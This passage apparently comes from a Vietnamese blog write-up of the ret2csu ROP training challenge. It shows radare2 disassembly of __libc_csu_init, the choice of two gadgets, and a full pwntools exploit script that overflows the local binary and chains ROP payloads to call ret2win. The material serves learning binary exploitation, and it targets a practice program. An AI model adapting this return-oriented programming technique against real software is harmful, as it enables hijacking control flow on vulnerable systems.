+<p><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p>
+<p>Ở đây ta sẽ có 2 Gadget, sử dụng radare2 để disassemble function __libc_csu_init__</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="nt">radare2</span><span class="w"> </span><span class="nt">ret2csu</span><span class="w"></span>
+<span class="cp">[</span><span class="mh">0x00400520</span><span class="cp">]</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">aaa</span><span class="w"></span>
+<span class="cp">[</span><span class="mh">0x00400520</span><span class="cp">]</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">afl</span><span class="w"></span>
+<span class="o">...</span><span class="w"></span>
+<span class="nt">0x00400640</span><span class="w">    </span><span class="nt">4</span><span class="w"> </span><span class="nt">101</span><span class="w">          </span><span class="nt">sym</span><span class="p">.</span><span class="nc">__libc_csu_init</span><span class="w"></span>
+<span class="o">...</span><span class="w"></span>
+<span class="cp">[</span><span class="mh">0x00400520</span><span class="cp">]</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">s</span><span class="w"> </span><span class="nt">sym</span><span class="p">.</span><span class="nc">__libc_csu_init</span><span class="w"></span>
+<span class="cp">[</span><span class="mh">0x00400640</span><span class="cp">]</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">pdf</span><span class="w"></span>
+<span class="w">            </span><span class="o">;</span><span class="w"> </span><span class="nt">DATA</span><span class="w"> </span><span class="nt">XREF</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">entry0</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="nt">0x400536</span><span class="w"></span>
+<span class="err">┌</span><span class="w"> </span><span class="nt">101</span><span class="o">:</span><span class="w"> </span><span class="nt">sym</span><span class="p">.</span><span class="nc">__libc_csu_init</span><span class="w"> </span><span class="o">(</span><span class="nt">int64_t</span><span class="w"> </span><span class="nt">arg1</span><span class="o">,</span><span class="w"> </span><span class="nt">int64_t</span><span class="w"> </span><span class="nt">arg2</span><span class="o">,</span><span class="w"> </span><span class="nt">int64_t</span><span class="w"> </span><span class="nt">arg3</span><span class="o">);</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="o">;</span><span class="w"> </span><span class="nt">arg</span><span class="w"> </span><span class="nt">int64_t</span><span class="w"> </span><span class="nt">arg1</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="nt">rdi</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="o">;</span><span class="w"> </span><span class="nt">arg</span><span class="w"> </span><span class="nt">int64_t</span><span class="w"> </span><span class="nt">arg2</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="nt">rsi</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="o">;</span><span class="w"> </span><span class="nt">arg</span><span class="w"> </span><span class="nt">int64_t</span><span class="w"> </span><span class="nt">arg3</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="nt">rdx</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400640</span><span class="w">      </span><span class="nt">4157</span><span class="w">           </span><span class="nt">push</span><span class="w"> </span><span class="nt">r15</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400642</span><span class="w">      </span><span class="nt">4156</span><span class="w">           </span><span class="nt">push</span><span class="w"> </span><span class="nt">r14</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400644</span><span class="w">      </span><span class="nt">4989d7</span><span class="w">         </span><span class="nt">mov</span><span class="w"> </span><span class="nt">r15</span><span class="o">,</span><span class="w"> </span><span class="nt">rdx</span><span class="w">                </span><span class="o">;</span><span class="w"> </span><span class="nt">arg3</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400647</span><span class="w">      </span><span class="nt">4155</span><span class="w">           </span><span class="nt">push</span><span class="w"> </span><span class="nt">r13</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400649</span><span class="w">      </span><span class="nt">4154</span><span class="w">           </span><span class="nt">push</span><span class="w"> </span><span class="nt">r12</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040064b</span><span class="w">      </span><span class="nt">4c8d259e0720</span><span class="o">.</span><span class="w">  </span><span class="nt">lea</span><span class="w"> </span><span class="nt">r12</span><span class="o">,</span><span class="w"> </span><span class="nt">obj</span><span class="p">.</span><span class="nc">__frame_dummy_init_array_entry</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">loc</span><span class="p">.</span><span class="nc">__init_array_start</span><span class="w"></span>
+<span class="err">│</span><span class="w">                                                                      </span><span class="o">;</span><span class="w"> </span><span class="nt">0x600df0</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400652</span><span class="w">      </span><span class="nt">55</span><span class="w">             </span><span class="nt">push</span><span class="w"> </span><span class="nt">rbp</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400653</span><span class="w">      </span><span class="nt">488d2d9e0720</span><span class="o">.</span><span class="w">  </span><span class="nt">lea</span><span class="w"> </span><span class="nt">rbp</span><span class="o">,</span><span class="w"> </span><span class="nt">obj</span><span class="p">.</span><span class="nc">__do_global_dtors_aux_fini_array_entry</span><span class="w"> </span><span class="o">;</span><span class="w"> </span><span class="nt">loc</span><span class="p">.</span><span class="nc">__init_array_end</span><span class="w"></span>
+<span class="err">│</span><span class="w">                                                                      </span><span class="o">;</span><span class="w"> </span><span class="nt">0x600df8</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040065a</span><span class="w">      </span><span class="nt">53</span><span class="w">             </span><span class="nt">push</span><span class="w"> </span><span class="nt">rbx</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040065b</span><span class="w">      </span><span class="nt">4189fd</span><span class="w">         </span><span class="nt">mov</span><span class="w"> </span><span class="nt">r13d</span><span class="o">,</span><span class="w"> </span><span class="nt">edi</span><span class="w">               </span><span class="o">;</span><span class="w"> </span><span class="nt">arg1</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040065e</span><span class="w">      </span><span class="nt">4989f6</span><span class="w">         </span><span class="nt">mov</span><span class="w"> </span><span class="nt">r14</span><span class="o">,</span><span class="w"> </span><span class="nt">rsi</span><span class="w">                </span><span class="o">;</span><span class="w"> </span><span class="nt">arg2</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400661</span><span class="w">      </span><span class="nt">4c29e5</span><span class="w">         </span><span class="nt">sub</span><span class="w"> </span><span class="nt">rbp</span><span class="o">,</span><span class="w"> </span><span class="nt">r12</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400664</span><span class="w">      </span><span class="nt">4883ec08</span><span class="w">       </span><span class="nt">sub</span><span class="w"> </span><span class="nt">rsp</span><span class="o">,</span><span class="w"> </span><span class="nt">8</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400668</span><span class="w">      </span><span class="nt">48c1fd03</span><span class="w">       </span><span class="nt">sar</span><span class="w"> </span><span class="nt">rbp</span><span class="o">,</span><span class="w"> </span><span class="nt">3</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040066c</span><span class="w">      </span><span class="nt">e85ffeffff</span><span class="w">     </span><span class="nt">call</span><span class="w"> </span><span class="nt">sym</span><span class="p">.</span><span class="nc">_init</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x00400671</span><span class="w">      </span><span class="nt">4885ed</span><span class="w">         </span><span class="nt">test</span><span class="w"> </span><span class="nt">rbp</span><span class="o">,</span><span class="w"> </span><span class="nt">rbp</span><span class="w"></span>
+<span class="err">│</span><span class="w">       </span><span class="err">┌─</span><span class="o">&lt;</span><span class="w"> </span><span class="nt">0x00400674</span><span class="w">      </span><span class="nt">7420</span><span class="w">           </span><span class="nt">je</span><span class="w"> </span><span class="nt">0x400696</span><span class="w"></span>
+<span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">   </span><span class="nt">0x00400676</span><span class="w">      </span><span class="nt">31db</span><span class="w">           </span><span class="nt">xor</span><span class="w"> </span><span class="nt">ebx</span><span class="o">,</span><span class="w"> </span><span class="nt">ebx</span><span class="w"></span>
+<span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">   </span><span class="nt">0x00400678</span><span class="w">      </span><span class="nt">0f1f84000000</span><span class="o">.</span><span class="w">  </span><span class="nt">nop</span><span class="w"> </span><span class="nt">dword</span><span class="w"> </span><span class="cp">[</span><span class="nx">rax</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">rax</span><span class="cp">]</span><span class="w"></span>
+<span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">   </span><span class="o">;</span><span class="w"> </span><span class="nt">CODE</span><span class="w"> </span><span class="nt">XREF</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">sym</span><span class="p">.</span><span class="nc">__libc_csu_init</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="nt">0x400694</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">┌──</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">0x00400680</span><span class="w">      </span><span class="nt">4c89fa</span><span class="w">         </span><span class="nt">mov</span><span class="w"> </span><span class="nt">rdx</span><span class="o">,</span><span class="w"> </span><span class="nt">r15</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">╎│</span><span class="w">   </span><span class="nt">0x00400683</span><span class="w">      </span><span class="nt">4c89f6</span><span class="w">         </span><span class="nt">mov</span><span class="w"> </span><span class="nt">rsi</span><span class="o">,</span><span class="w"> </span><span class="nt">r14</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">╎│</span><span class="w">   </span><span class="nt">0x00400686</span><span class="w">      </span><span class="nt">4489ef</span><span class="w">         </span><span class="nt">mov</span><span class="w"> </span><span class="nt">edi</span><span class="o">,</span><span class="w"> </span><span class="nt">r13d</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">╎│</span><span class="w">   </span><span class="nt">0x00400689</span><span class="w">      </span><span class="nt">41ff14dc</span><span class="w">       </span><span class="nt">call</span><span class="w"> </span><span class="nt">qword</span><span class="w"> </span><span class="cp">[</span><span class="nx">r12</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">rbx</span><span class="o">*</span><span class="mi">8</span><span class="cp">]</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">╎│</span><span class="w">   </span><span class="nt">0x0040068d</span><span class="w">      </span><span class="nt">4883c301</span><span class="w">       </span><span class="nt">add</span><span class="w"> </span><span class="nt">rbx</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">╎│</span><span class="w">   </span><span class="nt">0x00400691</span><span class="w">      </span><span class="nt">4839dd</span><span class="w">         </span><span class="nt">cmp</span><span class="w"> </span><span class="nt">rbp</span><span class="o">,</span><span class="w"> </span><span class="nt">rbx</span><span class="w"></span>
+<span class="err">│</span><span class="w">      </span><span class="err">└──</span><span class="o">&lt;</span><span class="w"> </span><span class="nt">0x00400694</span><span class="w">      </span><span class="nt">75ea</span><span class="w">           </span><span class="nt">jne</span><span class="w"> </span><span class="nt">0x400680</span><span class="w"></span>
+<span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">   </span><span class="o">;</span><span class="w"> </span><span class="nt">CODE</span><span class="w"> </span><span class="nt">XREF</span><span class="w"> </span><span class="nt">from</span><span class="w"> </span><span class="nt">sym</span><span class="p">.</span><span class="nc">__libc_csu_init</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="nt">0x400674</span><span class="w"></span>
+<span class="err">│</span><span class="w">       </span><span class="err">└─</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">0x00400696</span><span class="w">      </span><span class="nt">4883c408</span><span class="w">       </span><span class="nt">add</span><span class="w"> </span><span class="nt">rsp</span><span class="o">,</span><span class="w"> </span><span class="nt">8</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040069a</span><span class="w">      </span><span class="nt">5b</span><span class="w">             </span><span class="nt">pop</span><span class="w"> </span><span class="nt">rbx</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040069b</span><span class="w">      </span><span class="nt">5d</span><span class="w">             </span><span class="nt">pop</span><span class="w"> </span><span class="nt">rbp</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040069c</span><span class="w">      </span><span class="nt">415c</span><span class="w">           </span><span class="nt">pop</span><span class="w"> </span><span class="nt">r12</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x0040069e</span><span class="w">      </span><span class="nt">415d</span><span class="w">           </span><span class="nt">pop</span><span class="w"> </span><span class="nt">r13</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x004006a0</span><span class="w">      </span><span class="nt">415e</span><span class="w">           </span><span class="nt">pop</span><span class="w"> </span><span class="nt">r14</span><span class="w"></span>
+<span class="err">│</span><span class="w">           </span><span class="nt">0x004006a2</span><span class="w">      </span><span class="nt">415f</span><span class="w">           </span><span class="nt">pop</span><span class="w"> </span><span class="nt">r15</span><span class="w"></span>
+<span class="err">└</span><span class="w">           </span><span class="nt">0x004006a4</span><span class="w">      </span><span class="nt">c3</span><span class="w">             </span><span class="nt">ret</span><span class="w"></span>
+<span class="cp">[</span><span class="mh">0x00400640</span><span class="cp">]</span><span class="o">&gt;</span><span class="w"></span>
+</code></pre></div>
+
+<p>Ta có Gadget 1:</p>
+<div class="highlight"><pre><span></span><code>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
+│      ╎│   0x00400683      4c89f6         mov rsi, r14
+│      ╎│   0x00400686      4489ef         mov edi, r13d
+│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
+</code></pre></div>
+
+<p>Gadget 2</p>
+<div class="highlight"><pre><span></span><code>│           0x0040069a      5b             pop rbx
+│           0x0040069b      5d             pop rbp
+│           0x0040069c      415c           pop r12
+│           0x0040069e      415d           pop r13
+│           0x004006a0      415e           pop r14
+│           0x004006a2      415f           pop r15
+└           0x004006a4      c3             ret
+</code></pre></div>
+
+<p>Với payload1 ta sử dụng Gadget 2 để truyền giá trị arg vào r13, r14, r15, Gadget2 cũng control r12 để kết hợp với Gadget 1 gọi đến hàm chúng ta mong muốn đồng thời control edi, rsi, rdx</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="n">libc_csu_int</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x5a</span><span class="p">)</span><span class="w"> </span><span class="c1"># Gadget 1</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># rbx</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="w"> </span><span class="c1"># rbp -&gt; add rbx, 0x1;cmp rbp, rbx; jne __libc_csu_init -&gt; rbx==rbp</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="n">init</span><span class="p">)</span><span class="w"> </span><span class="c1"># r12 -&gt; call qword [r12 + rbx*8]</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span><span class="w"> </span><span class="c1"># r13 -&gt; edi</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span><span class="w"> </span><span class="c1"># r14 -&gt; rsi</span><span class="w"></span>
+<span class="n">payload1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span><span class="w"> </span><span class="c1"># r15 -&gt; rdx</span><span class="w"></span>
+</code></pre></div>
+
+<p>Tới đây ta có rsi và rdx, riêng rdi ta cần phải thực hiện ở payload2, đó là lí do ta không gọi trực tiếp hàm ret2win với r12</p>
+<p>Với r12 ta sử dụng hàm <code>__init__</code> vì  nó không cần đối số</p>
+<p>Ta thấy sau <code>call qword [r12 + rbx*8]</code> thì rbx sẽ từ 0 thêm 1 và nếu rbp khác rbx  thì sẽ quay lại 0x400680. Đó là lí do tại payload1 ta sẽ cho rbp bằng 0x1 để thực hiện đoạn tiếp theo và đoạn này chứa Gadget 2</p>
+<div class="highlight"><pre><span></span><code>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
+│      ╎│   0x00400683      4c89f6         mov rsi, r14
+│      ╎│   0x00400686      4489ef         mov edi, r13d
+│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
+│      ╎│   0x0040068d      4883c301       add rbx, 1
+│      ╎│   0x00400691      4839dd         cmp rbp, rbx
+│      └──&lt; 0x00400694      75ea           jne 0x400680
+</code></pre></div>
+
+<p>Ở payload 2 ta sẽ thêm vào rsp một đoạn padding bất kỳ do trước kế tiếp payload1 sẽ là <code>add rsp, 8</code>, tại payload 2 ta gọi hàm trong r12 ở đây là <code>__init__</code> (chỉ để giữ nguyên rsi, rdi, rdx). Kế tiếp ta truyền giá trị cho rdi do Gadget 2 trước đó chỉ control được edi. </p>
+<div class="highlight"><pre><span></span><code><span class="n">payload2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="n">libc_csu_int</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">)</span><span class="w"> </span><span class="c1"># Gadget 2</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># rbx</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># rbp</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># r12</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># r13</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># r14</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="c1"># r15</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4006a3</span><span class="p">)</span><span class="w"> </span><span class="c1"># 0x00000000004006a3: pop rdi; ret;</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span><span class="w"> </span><span class="c1"># -&gt; rdi</span><span class="w"></span>
+<span class="n">payload2</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p64</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span><span class="w"></span>
+</code></pre></div>
+
+<p>Kết hợp 2 payload</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">libc_csu_int</span> <span class="o">=</span> <span class="mh">0x400640</span> <span class="c1"># 55  0x00000640 0x00400640 GLOBAL FUNC   101      __libc_csu_init</span>
+<span class="n">init</span> <span class="o">=</span> <span class="mh">0x400398</span> <span class="c1"># 0x400398 point to 0x4004d0 # 8   0x000004d0 0x004004d0 GLOBAL FUNC   0        _init</span>
+<span class="n">ret2win_GOT</span> <span class="o">=</span> <span class="mh">0x601020</span> <span class="c1"># 0x00400510 ff250a0b2000   jmp qword [reloc.ret2win]   ; [0x601020:8]=0x400516</span>
+<span class="n">ret2win</span> <span class="o">=</span> <span class="mh">0x400510</span> <span class="c1">#2   0x00000510 0x00400510 GLOBAL FUNC   16       imp.ret2win</span>
+
+
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2csu&#39;</span><span class="p">)</span>
+<span class="c1"># gdb.attach(p,&#39;&#39;&#39;</span>
+<span class="c1"># break *pwnme</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_csu_int</span> <span class="o">+</span> <span class="mh">0x5a</span><span class="p">)</span> <span class="c1"># Gadget 1</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># rbx</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># rbp -&gt; add rbx, 0x1;cmp rbp, rbx; jne __libc_csu_init -&gt; rbx==rbp</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">init</span><span class="p">)</span> <span class="c1"># r12 -&gt; call qword [r12 + rbx*8]</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="c1"># r13 -&gt; edi</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span> <span class="c1"># r14 -&gt; rsi</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span> <span class="c1"># r15 -&gt; rdx</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_csu_int</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="c1"># Gadget 2</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># rbx</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># rbp</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># r12</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># r13</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># r14</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># r15</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006a3</span><span class="p">)</span> <span class="c1"># 0x00000000004006a3: pop rdi; ret;</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="c1"># -&gt; rdi</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span>
+
+<span class="n">line1</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">line1</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span> <span class="o">+</span> <span class="n">payload2</span><span class="p">)</span>
+<span class="n">line2</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">line2</span><span class="p">)</span>
+
+<span class="c1"># p.interactive()</span>
+</code></pre></div>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2023-10-17T00:00:00+07:00">Tue 17 October 2023</time>
+            <h4>Category</h4>
+            <a class="category-link" href="./categories.html#trang-chu-ref">Trang chủ</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="./tags.html#binary-ref">binary
+                    <span class="superscript">2</span>
+</a></li>
+                <li><a href="./tags.html#exploit-ref">exploit
+                    <span class="superscript">2</span>
+</a></li>
+                <li><a href="./tags.html#rop-ref">rop
+                    <span class="superscript">2</span>
+</a></li>
+                <li><a href="./tags.html#x64-ref">x64
+                    <span class="superscript">2</span>
+</a></li>
+            </ul>
+<h4>Contact</h4>
+<div id="sidebar-social-link">
+</div>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>                    </div>
+                    <div class="span1"></div>
+                </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
